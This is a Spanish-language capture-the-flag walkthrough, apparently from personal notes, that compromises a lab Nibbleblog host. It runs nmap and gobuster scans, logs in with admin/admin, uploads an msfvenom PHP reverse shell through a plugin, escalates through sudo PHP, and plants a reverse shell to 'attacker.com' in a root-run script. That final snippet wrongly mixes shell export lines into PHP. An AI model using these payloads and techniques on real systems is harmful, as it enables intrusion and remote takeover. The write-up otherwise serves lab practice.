
Hacemos un scaneo de puertos con [[00. Apuntes/01. Herramientas/NMAP|NMAP]]
`nmap -p- --open -sS --min-rate 5000 -Pn -n 172.17.0.2`

Encontramos el puerto 80 abierto, vamos a hacer el scaneo mas profundo
`nmap -p 80 -sSCV --min-rate 5000 -Pn -n 172.17.0.2`

Navegando en la IP lo unico que nos encontramos es la pagina por defecto de Apache2. Vamos a hacer Fuzzing con [[00. Apuntes/01. Herramientas/GOBUSTER|GOBUSTER]] para ver si encontramos algo. No encontramos nada.
Miramos el codigo fuente por si encontramos algo relevante, encontramos una posible ruta web.
![[Pasted image 20241214130625.png]]

Navegamos a la ruta y encontramos una pagina web
Encontramos lo siguiente
![[Pasted image 20241215134018.png]]

Podemos ver un enlace que redirige a `admin.php` al hecer click encontramos una pagina de login
![[Pasted image 20241215134146.png]]

Como vemos que es el area de administrador he probado con el usuario `admin` y como password `admin` hemos conseguido obtener acceso al area del administrador.
![[Pasted image 20241215134417.png]]

Hay un apartado para plugins en el veremos que pligins podemos instalar para venenficiarnos de el, hay ino que se llama `MyImages` que nos permite subir ficheros asi que le instalararemos e  intentaremos ingresar un payload de reverse shell en PHP
![[Pasted image 20241215135110.png]]

Creamos el payload con [[00. Apuntes/01. Herramientas/MSFVENOM|MSFVENOM]]
`msfvenom -p php/reverse_php LHOST=10.0.2.15 LPORT=444 raw > pwned.php`

Subimos el payload y hacemos Fuzzing con [[01. Other Notes/01. Hacking/Hacking Generico/Hacking Web/Fuzzing Web/Gobuster|Gobuster]] para ver en que ubicacion se guardan los archivos
`gobuster dir -u http://172.17.0.2/nibbleblog/content/private -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,py -k`
Hemos ido añadiendo directorio por directorio gasta llegar a `/nibbleblog/content/private/plugins/ ` en el cual hay hay una carpeta llamada `my_image`
![[Pasted image 20241215140225.png]]

Al entrar en ella podemos observar que el palyload que hemos subido se guarda como `image.php`
![[Pasted image 20241215140319.png]]

Nos pondremos en escucha con [[NETCAT]] y ejecutaremos el payload
` nc -lvnp 444`

Una vez obtenemos la shell tenemos que estabilizarla para poder trabajar agusto con ella.
Navegando a `/home` vemos que existe el usuario chocolate. Y ejecutando el comando `sudo -l` podemos ber que es capaz de ejecutar codico PHP, asi que buscaremos la forma de hacer la escalada de privilegios con PHP. 
Usaremos una escalada de privilegios de [[GTFOBINS]]
`sudo -u chocolate /usr/bin/php -r "system('$CMD');" bash`

El usuario root tine ejecutando un script .php en `/opt/script.php`
Lo modificaremos he introduciremos una reverse shell hacia nuestra maquina atacante
````php
<?php
	export RHOST=attacker.com
	export RPORT=12345
	php -r '$sock=fsockopen(getenv("RHOST"),getenv("RPORT"));exec("/bin/sh -i <&3 >&3 2>&3");'
?>
````

En nuestra maquina atacante nos pondremos en escucha en el puerto mencionado en el script y ya obtendremos una shell como root.